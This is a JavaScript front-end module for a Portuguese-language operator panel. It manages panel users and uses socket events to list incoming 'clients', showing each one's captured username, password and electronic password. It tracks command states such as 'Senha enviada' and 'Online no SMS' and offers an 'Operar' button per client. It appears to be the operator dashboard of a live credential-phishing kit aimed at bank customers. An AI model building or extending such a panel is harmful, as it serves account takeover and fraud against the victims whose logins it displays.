
const panel = (() => {
    //private var/functions
    async function handleExcludeUser(btn) {

        try {
            const id = btn.dataset.exclude

            if(!id) return

            const user = await util.del(`/api/user/${id}`)

            //listUsersModal
            btn.closest('tr').remove()
            $('#listUsersModal').modal('hide')

            $('#listUsersModal').on('hidden.bs.modal', function (e) {
                // do something...
                util.notify({ icon: 'success', title: 'Sucesso', message: `Usuário ${user.name} excluido consucesso`, type: 'success' })

                $(this).off('hidden.bs.modal')
            })

        } catch (error) {
            util.notify({ icon: 'error', title: 'Erro ao excluir usuário', message: error.message, type: 'error' })
            console.log(error);
        }
        
    }

    function excludeUser() {
        const btnExclude = [...document.querySelectorAll('button.delete-user')];


        if(!btnExclude) return

        btnExclude.forEach(btn => {
            btn.addEventListener('click', function (e) {
                e.preventDefault()
    
                handleExcludeUser(btn)
            });
        });

        
    }

    function handleCount(minute, second, field) {
        //return { minute, second }

        setInterval(() => {
            if (field.innerHTML.indexOf('SAIU') == -1) {
                if (second == 59) {
                    minute = minute + 1
                    second = 0
                } else {
                    second = second + 1
                }

                field.innerHTML = ('0' + minute).slice(-2) + ':' + ('0' + second).slice(-2)
            }
        }, 1000)
    }

    function handleTimer(field) {
        const timer = field.innerHTML.split(':')

        const minute = parseInt(timer[0])

        const seconds = parseInt(timer[1])

        handleCount(minute, seconds, field)
    }

    function timer() {
        const timers = [...document.querySelectorAll('td[role="time"]')]

        if (timers) timers.forEach(handleTimer)
    }

    function createUserHTML(user) {
        const tr = document.createElement('tr')

        tr.innerHTML = `
        <th scope="row">6</th>
        <td>${user.name}</td>
        <td>${user.user}</td>
        <td>${user.type}</td>
        <td>
            <button type="button" class="btn btn-primary btn-sm" data-update="${user.id}">Editar</button>
            <button type="button" class="btn btn-danger delete-user btn-sm" data-exclude="${user.id}">Excluir</button>
        </td>
        `

        const btnExclude = tr.querySelector('.delete-user');

        //action exclude user
        btnExclude.addEventListener('click', function (e) {
            e.preventDefault()

            handleExcludeUser(btnExclude)
        });

        const target = document.querySelector('#listUsersModal .modal-body tbody')

        if(target) target.append(tr)
    }

    async function register() {
        const form = document.querySelector('.formRegister')

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const data = util.serialize(form)

                const user = await util.post(`/api/user`, JSON.stringify(data), true)

                //add user in list
                createUserHTML(user)

                $('#modalRegister').modal('hide')

                $('#modalRegister').on('hidden.bs.modal', function (e) {
                    // do something...
                    util.notify({
                        icon: 'success',
                        title: 'Sucesso',
                        message: `Usuário ${user.name} cadastrado com sucesso`,
                        type: 'success',
                    })

                    $(this).off('hidden.bs.modal')
                })
            } catch (error) {
                $('#modalRegister').modal('hide')

                $('#modalRegister').on('hidden.bs.modal', function (e) {
                    // do something...
                    util.notify({
                        icon: 'alert-icon ni ni-bell-55',
                        title: 'Erro',
                        message: error,
                        type: 'warning',
                    })

                    $(this).off('hidden.bs.modal')
                })
                
                console.log(error)
            }
        })
    }

    function handleReconnect(client) {
        const { id, user, password, updatedAt, status, type } = client

        const { operator } = client

        const tr = document.querySelector(`tr[data-id="${id}"]`)

        if (!tr) return

        const roleId = tr.querySelector(`th[role="id"]`)
        const roleOperator = tr.querySelector(`strong[role="operator"]`)
        const roleUser = tr.querySelector(`td[role="user"]`)
        const rolePassword = tr.querySelector(`td[role="password"]`)
        const roleType = tr.querySelector(`td[role="type"]`)
        const roleTime = tr.querySelector(`td[role="time"]`)
        const roleCommand = tr.querySelector(`td[role="command"]`)

        roleCommand.innerHTML = 'Aguardando comando'
        roleType.innerHTML = type

        let time = new Date() - new Date(updatedAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        if (operator) roleOperator.innerHTML = operator.name

        roleUser.innerHTML = user
        rolePassword.innerHTML = password
        roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
    }

    function createClient(client) {
        const { id, user, password, eletronicPassword, type, createdAt, status } = client

        const checkexist = document.querySelector(`tr[data-id="${id}"]`);

        if(checkexist) {
            const checkTd = checkexist.querySelector('td[role="command"]')

            if(checkTd) return checkTd.innerHTML = status
        }

        const tr = document.createElement('tr')

        tr.dataset.id = id

        tr.innerHTML = `
        <th scope="row" role="id"># ${id}</th>
        <td><strong role="operator">Aguardando OP</strong></td>
        <td><a class="btn btn-success btn-sm" target="blank" href="/operator?client=${id}" role="button">Operar</a></td>
        <td role="user">${user}</td>
        <td role="password">${password}</td>
        <td role="type">${type}</td>
        <td role="time">132:50</td>
        <td role="command">Aguardando Comando</td>
        `

        const roleTime = tr.querySelector('td[role="time"]')

        let time = new Date() - new Date(createdAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)

        roleTime.innerHTML = time

        setInterval(() => {
            if (seconds == 59) {
                minutes = minutes + 1
                seconds = 0
            } else {
                seconds = seconds + 1
            }

            roleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
        }, 1000)

        //timer(roleTime)

        document.querySelector('.productList').prepend(tr)
    }

    function cleanClients() {
        const btn = document.querySelector('.btn-clean');

        if(!btn) return

        btn.addEventListener('click', function (e) {
            e.preventDefault()

            socket.emit('clean', {message: 'limpei'})


        });
    }

    function clientEnter() {
        socket.on('reconnectClient', (client) => {
            handleReconnect(client)
        })

        socket.on('newClient', createClient)
    }

    function receiver() {
        socket.on('sendPassword', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            if(!roleId) return

            const command = roleId.querySelector('td[role="command"]')

            if (command) command.innerHTML = `Senha enviada!`
        })

        socket.on('assignClient', (client) => {
            handleReconnect(client)
        })

        socket.on('finish', (client) => {
            return handleReconnect(client)
        })

        socket.on('clientDisconnect', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            if(!roleId) return

            const command = roleId.querySelector('td[role="time"]')

            if (command) command.innerHTML = `SAIU`
        })

        socket.on('clientDestroy', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            if(roleId) roleId.remove()
        })

        socket.on('await', (client) => {
            const field = document.querySelector(`tr[data-id="${client.id}"]`)

            if (field) {
                const role = field.querySelector('td[role="command"]')

                role.innerHTML = `Aguardando Comando`
            }
        })

        socket.on('inSMS', (client) => {
            const { updatedAt } = client

            const minutes = new Date(updatedAt).getMinutes()
            const seconds = new Date(updatedAt).getSeconds()

            console.log(('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2))

            setTimeout(() => {
                //util.countOnline(client.updatedAt)

                const tr = document.querySelector(`tr[data-id="${client.id}"]`)

                if (tr) {
                    const roleCommand = tr.querySelector('td[role="command"]')
                    const roleTime = tr.querySelector('td[role="time"]')

                    if (roleCommand) roleCommand.innerHTML = `Online no SMS`
                    if (roleTime) roleTime.innerHTML = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
                }
            }, 500)
        })

        socket.on('clean', count => {

            const usersDestroy = [...document.querySelectorAll('.productList tr')];

            if(!usersDestroy) return

            usersDestroy.forEach(client => {
                const time = client.querySelector('td[role="time"]')

                if(!time) return

                const times = time.innerHTML.split(':')

                if(times) {
                    const minute = parseInt(times)
                    if(minute > 9) client.remove()
                }

                if(time.innerHTML.indexOf('SAIU') != -1) client.remove()
            });
        })
    }

    return {
        //public var/functions
        clientEnter,
        receiver,
        register,
        timer,
        excludeUser,
        cleanClients
    }
})()

panel.clientEnter()
panel.receiver()
panel.register()
panel.timer()
panel.excludeUser()
panel.cleanClients()
